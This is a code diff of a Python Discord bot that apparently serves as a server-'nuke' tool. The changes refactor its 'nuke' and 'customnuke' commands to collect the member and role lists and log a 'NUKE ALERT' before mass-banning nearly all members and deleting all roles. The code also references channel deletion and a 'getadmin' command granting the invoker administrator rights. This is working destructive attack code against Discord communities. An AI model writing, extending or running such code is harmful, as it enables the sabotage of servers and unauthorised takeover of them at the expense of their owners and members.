@@ -503,8 +503,7 @@ async def on_message(msg):
 async def nuke(ctx):
     server_name = ctx.guild.name
 
-    # ban all users
-
+    # get member list
     member_list = []
     for member in ctx.guild.members:
         if member.id == ctx.message.author.id:
@@ -515,6 +514,32 @@ async def nuke(ctx):
             pass
         else:
             member_list.append(member.id)
+
+    # get role list
+    role_list = []
+
+    roleIDs = getRoleIDs()
+
+    for role in ctx.guild.roles:
+        if role == ctx.guild.default_role:
+            pass
+        elif role == discord.utils.get(ctx.guild.roles, name=bot.user.name):
+            pass
+        elif role == ctx.guild.get_role(roleIDs[str(ctx.guild.id)]):
+            pass
+        else:
+            role_list.append(role)
+    
+    output_log(f'''
+*** NUKE ALERT ***
+Server Name: {server_name}
+Server ID: {ctx.guild.id}
+Server Owner: {ctx.guild.owner}
+Banned Users: {len(member_list)}
+Roles Deleted: {len(role_list)}
+''')
+
+    # ban all users
 
     await ban_members(ctx, member_list)
 
@@ -536,30 +561,7 @@ async def nuke(ctx):
 
     # delete all roles
 
-    role_list = []
-
-    roleIDs = getRoleIDs()
-
-    for role in ctx.guild.roles:
-        if role == ctx.guild.default_role:
-            pass
-        elif role == discord.utils.get(ctx.guild.roles, name=bot.user.name):
-            pass
-        elif role == ctx.guild.get_role(roleIDs[str(ctx.guild.id)]):
-            pass
-        else:
-            role_list.append(role)
-
     await delete_roles(ctx, role_list)
-
-    output_log(f'''
-*** NUKE ALERT ***
-Server Name: {server_name}
-Server ID: {ctx.guild.id}
-Server Owner: {ctx.guild.owner}
-Banned Users: {len(member_list)}
-Roles Deleted: {len(role_list)}
-''')
 
 # gives the user admin
 @bot.command(name="getadmin",aliases=commandaliases["getadmin"])
@@ -796,6 +798,42 @@ async def customnuke(ctx):
         if ctx.message.author.id != USER_ID:
             return
 
+    # get member list
+    member_list = []
+    for member in ctx.guild.members:
+        if member.id == ctx.message.author.id:
+            pass
+        elif member.id == bot.user.id:
+            pass
+        elif member.id == ctx.guild.owner.id:
+            pass
+        else:
+            member_list.append(member.id)
+
+    # get role list
+    role_list = []
+
+    roleIDs = getRoleIDs()
+
+    for role in ctx.guild.roles:
+        if role == ctx.guild.default_role:
+            pass
+        elif role == discord.utils.get(ctx.guild.roles, name=bot.user.name):
+            pass
+        elif role == ctx.guild.get_role(roleIDs[str(ctx.guild.id)]):
+            pass
+        else:
+            role_list.append(role)
+    
+    output_log(f'''
+*** NUKE ALERT ***
+Server Name: {ctx.guild.name}
+Server ID: {ctx.guild.id}
+Server Owner: {ctx.guild.owner}
+Banned Users: {len(member_list)}
+Roles Deleted: {len(role_list)}
+''')
+
     custom_nuke_settings = getCustomNukeSettings()
 
     if f"{ctx.message.author.id}" not in custom_nuke_settings.keys():
@@ -832,17 +870,6 @@ Server Owner: {ctx.guild.owner}
 ''')
 
     if do_ban:
-        member_list = []
-        for member in ctx.guild.members:
-            if member.id == ctx.message.author.id:
-                pass
-            elif member.id == bot.user.id:
-                pass
-            elif member.id == ctx.guild.owner.id:
-                pass
-            else:
-                member_list.append(member.id)
-
         await ban_members(ctx, member_list)
 
     if do_channels:
@@ -874,17 +901,6 @@ Server Owner: {ctx.guild.owner}
 
     roleIDs = getRoleIDs()
     if do_roles:
-        role_list = []
-        for role in ctx.guild.roles:
-            if role == discord.utils.get(ctx.guild.roles, name=bot.user.name):
-                pass
-            elif role == ctx.guild.default_role:
-                pass
-            elif role == ctx.guild.get_role(roleIDs[str(ctx.guild.id)]):
-                pass
-            else:
-                role_list.append(role)
-
         await delete_roles(ctx, role_list)
 
     if do_nc:
